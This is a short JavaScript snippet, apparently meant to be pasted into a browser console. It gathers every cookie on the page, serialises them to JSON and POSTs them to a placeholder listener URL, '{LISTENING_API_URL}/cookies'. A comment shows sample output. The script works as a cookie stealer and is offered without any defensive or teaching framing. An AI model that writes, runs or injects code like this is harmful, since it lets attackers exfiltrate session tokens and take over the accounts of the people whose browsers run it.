// Execute this script in the browser console
const cookies = document.cookie.split('; ').map(cookie => {
    const [name, value] = cookie.split('=');
    return { name, value };
});


const cookiesJSON = JSON.stringify(cookies, null, 2);


const apiUrl = '{LISTENING_API_URL}/cookies';

fetch(apiUrl, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: cookiesJSON,
});


// Output:
// {
//     "cookies": [
//         {"name": "cookie1", "value": "value1"},
//         {"name": "cookie2", "value": "value2"}
//     ]
// }
